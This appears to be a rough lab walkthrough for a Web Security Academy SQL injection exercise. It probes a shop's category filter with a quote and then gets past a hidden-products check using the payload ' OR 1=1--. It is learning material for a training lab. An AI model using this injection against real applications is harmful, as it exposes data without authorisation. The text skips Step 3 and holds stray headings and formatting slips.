# Step 1: Browse the Lab

1. Browse the lab.
2. Click any product category (for example, **Gifts**).
3. Find a request at the top similar to:

```
**https://0a7000690341334980a10847001d0050.web-security-academy.net/filter?category=Gifts**
```

---

# Step 2: Modify the Category Parameter

Replace the category value with:

```sql
**https://0a7000690341334980a10847001d0050.web-security-academy.net/filter?category='**
```

Shows **Internal Server Error**

Next:

```
**https://0a7000690341334980a10847001d0050.web-security-academy.net/filter?category='--**
```

---

No **Internal Server Error**

# 

---

# Step 4: After the Injection

Your payload:

```sql
**https://0a7000690341334980a10847001d0050.web-security-academy.net/filter?category='** **OR 1=1--**
```

changes the SQL into something similar to:

```sql
SELECT *
FROM products
WHERE category=''
OR 1=1
--'
AND released=1;
```

Notice what happens:

- The `'` closes the original string.
- `OR 1=1` adds a condition that is **always true**.
- `-` comments out the remainder of the query, so the `AND released=1` check is ignored.

The database effectively executes:

```sql
SELECT *
FROM products
WHERE category=''
OR 1=1;
```

---

# hh
